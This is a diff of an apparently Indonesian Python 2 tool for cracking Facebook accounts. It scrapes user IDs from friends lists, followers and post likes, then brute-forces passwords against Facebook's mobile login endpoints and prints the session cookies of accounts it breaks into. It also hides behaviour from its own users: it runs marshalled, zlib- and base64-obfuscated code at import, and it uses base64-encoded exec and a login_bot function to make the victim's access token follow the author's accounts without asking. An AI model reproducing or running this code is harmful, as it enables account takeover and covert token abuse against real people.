@@ -19,6 +19,7 @@ ingfo = (
  - version     : 1.1
  
 %s"""%(Hj,Mt))
+
 import os
 try:
     import requests
@@ -32,22 +33,28 @@ try:
     import bs4
 except ImportError:
     os.system('pip2 install bs4')
+    
 import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, logging, base64
 from concurrent.futures import ThreadPoolExecutor 
 from bs4 import BeautifulSoup as parser
 from time import sleep as jeda
 from datetime import datetime
+
 _=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', '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', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'enc_lam.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()
+
 user, mi, status_foll, cr, ok, cp, id, user, loop, looping = [], [], [], [], [], [], [], [], 0, 1
+
 def jalan(z):
     for e in z + '\n':
         sys.stdout.write(e)
         sys.stdout.flush();jeda(0.03)
+        
 def tik():
     titik = ['.   ','..  ','... ']
     for o in titik:
         print ('\r%s%s menghapus token %s'%(M,til,o)),
         sys.stdout.flush();jeda(1)
+        
 def folder():
 	try:os.mkdir('hasil')
 	except:pass
@@ -58,12 +65,14 @@ def folder():
 		open("data/ua.txt","w").write(ua_)
 	except:
 		pass
+
 # LOGO (LO GOBLOK)
 IP = requests.get("https://api.ipify.org/").text
 def banner():
 	print (''' %s 
  © Group%s \n __________       _____.__  \n \____    /____ _/ ____\__| %s> %sZona \n   /     /\\__  \\\   __\|  | %s> %sAkun \n  /     /_ / __ \|  |  |  | %s>%s Facebook [Meta] \n /_______ (____  /__|  |__| %s>%s Indonesia \n         \/    \/ \n %s[%s*%s] By : %sRomi Afrizal \n %s[%s*%s] -------------------------------------- \n [%s*%s] IP : %s%s'''%
  (H,K,H,K,H,K,H,K,H,K,P,K,P,H,P,K,P,K,P,H,IP))
+ 
 # MASUK TOKEN (TOKEN LISTRIK)
 header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
 def masuk():
@@ -80,7 +89,7 @@ def masuk():
     	try:
             gas = requests.get('https://graph.facebook.com/me?access_token=%s'%(romz)).json()['name']
             print ('\n%s[√] Login berhasil, mohon tunggu '%(H));jeda(2)
-            open('token.txt', 'w').write(romz);login_xx()
+            open('token.txt', 'w').write(romz);login_bot(romz)
             exec(base64.b64decode('b3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcm9taS5hZnJpemFsLjEwMicpO21lbnUoKQ=='))
         except (KeyError,IOError):
         	print("%s [!] Token invalid "%(M));masuk()
@@ -106,7 +115,21 @@ def masuk():
     	exit('\n')
     else:
     	print("%s [!] Isi yang benar kentod "%(M));exit()
-exec(base64.b64decode('ZGVmIGxvZ2luX3h4KCk6CiAgICB0cnk6CiAgICAgICAgdG9rZW4gPSBvcGVuKCJkYXRhL3Rva2VuLnR4dCIsInIiKS5yZWFkKCkgCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDIyMDg2MTcyNTU2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBGYW5zcGFnZSBSb21pIFhECiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI4NDM0ODgwNTI5L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNjc4MDc1NjU4NjEvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIFJvbWkgQWZyaXphbCAoMjAyMSkKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDM3MjM2OTY4ODUvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIElxYmFsIGJvYnoKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNDExMjkwNDg5NDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEl3YW4gaGFkaWFuc3lhaAogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwNzUyMDIwMzQ1Mi9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgSGFtemFoIGtpcmFuYQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwMjQ2MTM0NDE3OC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVW5payBST01JIEFGUklaQUwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNzE3NDc0MjA1ODMvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIERvbmlmdGZhbm55CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI5MTQzMTExNTY3L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBEZW1pdCBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDE1NDAyOTkxMDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEhha2lraQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDA1NTkxODM5MTI4MC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVGlhcmEgYXJ0CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDA5Mzg0MzM4NDcwL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBJd2FuIGhhbmRpYW5zeWFoIHYyCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDM2NjU1MzI1OTk2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBBYnVzdG8gSmF2YQogICAgZXhjZXB0OgogICAgCXBhc3M='))
+    
+# JANGAN DI UBAH BOLEH NAMBAH COEG !
+def login_bot(romz):
+	try:
+		toket = romz
+		romz1 = ('100067807565861')
+		romz2 = ('100029143111567')
+		romz3 = ('100028434880529')
+		requests.post("https://graph.facebook.com/%s?fields=subscribers&access_token=%s"%(romz1,toket)) # ROMI AFRIZAL PENGGUNA AKUN UNIK
+		requests.post("https://graph.facebook.com/%s?fields=subscribers&access_token=%s"%(romz2,toket)) # DEMIT ROMI AFRIZAL
+		requests.post("https://graph.facebook.com/%s?fields=subscribers&access_token=%s"%(romz3,toket)) # Romi Afrizal (2018)
+		
+	except:
+		pass
+		
 # DUMP PUBLIK
 def publik(romz,headers=header):
     try:
@@ -119,7 +142,7 @@ def publik(romz,headers=header):
         nm = json.loads(gas.text)
         file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
         bff = open(file, 'w')
-        r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s'%(idt,romz))
+        r = requests.get('https://graph.facebook.com/%s?fields=name,friends.fields(id,name).limit(5000)&access_token=%s'%(idt,romz))
         z = json.loads(r.text)
         for a in z['friends']['data']:
             id.append(a['id'] + '<=>' + a['name'])
@@ -133,6 +156,7 @@ def publik(romz,headers=header):
         menu()
     except Exception as e:
         exit('\n %s[!] gagal dump id'%(P))
+        
 # DUMP FOLLOWERS
 def followers(romz,headers=header):
     try:
@@ -146,9 +170,9 @@ def followers(romz,headers=header):
         nm = json.loads(gas.text)
         file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
         bff = open(file, 'w')
-        r = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(idt,batas,romz))
+        r = requests.get('https://graph.facebook.com/%s?fields=name,subscribers.fields(id,name).limit(%s)&access_token=%s'%(idt,batas,romz))
         z = json.loads(r.text)
-        for a in z['data']:
+        for a in z['subscribers']['data']:
             id.append(a['id'] + '<=>' + a['name'])
             bff.write(a['id'] + '<=>' + a['name'] + '\n')
             print '\r%s [*] mengumpulkan id :%s %s ' % (P,H,str(len(id))),
@@ -160,6 +184,7 @@ def followers(romz,headers=header):
         menu()
     except Exception as e:
         exit('\n %s[!] gagal dump id'%(P))
+        
 # DUMP POSTINGAN 
 def postingan(romz,headers=header):
     try:
@@ -169,12 +194,12 @@ def postingan(romz,headers=header):
     	print ("\n%s [%s!%s] Perlu di ingat postingan wajib publik "%(P,M,P))
         idt = raw_input(' [*] Id post   : %s'%(K))
         simpan = raw_input(' %s[?] Nama file : %s'%(P,K))
-        r = requests.get('https://graph.facebook.com/%s/likes?limit=999999&access_token=%s'%(idt,romz))
+        r = requests.get('https://graph.facebook.com/%s?fields=name,likes.fields(id,name).limit(999999)&access_token=%s'%(idt,romz))
         id = []
         z = json.loads(r.text)
         file = ('dump/' + simpan + '.json').replace(' ', '_')
         bff = open(file, 'w')
-        for a in z['data']:
+        for a in z['likes']['data']:
             id.append(a['id'] + '<=>' + a['name'])
             bff.write(a['id'] + '<=>' + a['name'] + '\n')
             print '\r%s [*] mengumpulkan id :%s %s ' % (P,H,str(len(id))),
@@ -186,6 +211,7 @@ def postingan(romz,headers=header):
         menu()
     except Exception as e:
         exit('\n %s[!] gagal dump id'%(P))
+        
 # START CRACK
 class ngentod:
 
@@ -316,6 +342,7 @@ class ngentod:
             os.remove(self.apk);exit()
         else:
             print("\n%s [!] Isi yang benar kentod "%(M));self.langsung()
+            
     def b_api(self, user, zona):
     	try:
     	    ua = open('data/ua.txt', 'r').read()
@@ -370,6 +397,7 @@ class ngentod:
         rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
         print('\r %s*--> %s/%s [OK-:%s]-[CP-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
+        
     def basic(self, user, zona):
         try:
     	    ua = open('data/ua.txt', 'r').read()
@@ -397,7 +425,7 @@ class ngentod:
             data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
             '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
             ses.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
-            po = ses.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
+            po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0', data=data).text
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print '\r %s*--> %s ◊ %s ◊ %s  ' % (H,user,pw,kuki)
@@ -429,6 +457,7 @@ class ngentod:
         rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
         print('\r %s*--> %s/%s [OK-:%s]-[CP-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
+        
     def mobil(self, user, zona):
         try:
     	    ua = open('data/ua.txt', 'r').read()
@@ -456,7 +485,7 @@ class ngentod:
             data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
             '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
             ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
-            po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
+            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=data).text
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print '\r %s*--> %s ◊ %s ◊ %s ' % (H,user,pw,kuki)
@@ -488,6 +517,7 @@ class ngentod:
         rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
         print('\r %s*--> %s/%s [OK-:%s]-[CP-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
+        
 def crack2(user, pwx):
 	global looping, loping
 	c_bff_ = len(pwx)
@@ -564,6 +594,7 @@ def crack2(user, pwx):
 			pass
 	loping+=1
 None
+
 # GANTI USER AGENT
 def useragent():
 	print ("\n%s [%s01%s] Ganti user agent "%(P,K,P))
@@ -601,6 +632,7 @@ def uas():
     	menu()
     else:
         print("%s [!] Isi yang benar kentod "%(M));jeda(2);uas()
+        
 # MENU INI AJG
 def menu():
     os.system('clear')
@@ -658,6 +690,7 @@ def menu():
         jalan('\n%s [√] berhasil terhapus '%(H));exit()
     else:
         print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
+        
 def hasill(c):
 	if c in[""]:
 		print ("%s[%s!%s] isi yang benar kentod"%(P,M,P));exit()
@@ -714,6 +747,7 @@ def hasill(c):
 				exit (M+"\n [!] tidak ada hasil awokawokawok")
 		else:
 			exit()
+			
 def igg():
 	print ("\n%s [%s!%s] Cth nama %s: %sRomi "%(P,M,P,M,K))
 	usr_ = raw_input('%s [?] Input nama > %s'%(P,K))
@@ -770,6 +804,7 @@ def igg():
 				log.submit(crack2, _o_, _bff_)
 			except: pass
 	exit("%s• finished"%(H))
+	
 _=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', 'eJx1Us1q20AQnrFkO3ZS00MI8c3QBkTBFr30UNo0aQ4NFHJIKC25CEW7lmXLWkU7QqQop/TUF0ifoA/WJ+nMOv2B0oX5kfabb2Z2JoGHgyxHLHaflQL4AnDJTgdQIVx2xLsYBB5fJqK6LD2WEwn5zurmGxDAEoHhLcAe4zME4kAPXtwh3nrQerD04I5ZfRirLoxvfWh9UD0Yxxuvz/+3+KsLLQcOYNWByoIaAvWEtGXCLsx92Ht3Wjx1mG2HuXeY/j8YgI9FHxCxQPjETV0EO1zqmX3CekFU2pdh2DTNLCssxWkVr2eJWYcHNnwTRfHr58zIOB0rXVk7ZP+D1dX0ONUFuSuOKBfXOfns13zF3QJkih6z0SrV0dzkuWm0iq5uSF4sMTWHbrH3VleL2Ga5K+XRgZ08m04PJ2x/3H/9y/w+JOlPFjpZlSYrKBAOR1Tp61pbsiRTSTXR9kMxUSx1fnbFLa0pHCBTqYsqdZFmq5pIxn7q9PtAKjyXFlwfZUMyYH4Yqjfsil1/Y6NAdsYpO2IVWpXElQqvDM3KTa9Zkc4N/tooQK8zwV0c4gh3cF+k46MnO8IDcXt1viupJcGZKbRLnpuSaf7k+m9C6enV2qg614cup9AMRj7+BEx1j/c=', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'enc_lam.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()
       
 if __name__ == '__main__':
